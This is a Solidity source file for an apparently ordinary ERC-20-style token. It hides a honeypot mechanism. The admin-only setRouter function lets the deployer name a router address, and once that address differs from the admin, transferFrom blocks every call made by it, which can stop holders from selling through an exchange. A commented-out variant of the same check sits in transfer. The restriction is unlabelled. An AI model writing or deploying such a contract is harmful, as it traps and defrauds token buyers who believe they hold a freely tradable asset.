// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Token {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 420000000 * 10 ** 18;
    string public name;
    string public symbol;
    uint256 public decimals = 18;

    address routerAddress;
    address adminAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
        balances[msg.sender] = totalSupply;
        adminAddress = msg.sender;
        routerAddress = msg.sender;
    }

    function setRouter(address a) public {
        require(msg.sender == adminAddress);
        routerAddress = a;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, "balance too low");
        // if (adminAddress != routerAddress) require(from != routerAddress);
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(balanceOf(from) >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "allowance too low");
        if (adminAddress != routerAddress) require(msg.sender != routerAddress);
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}
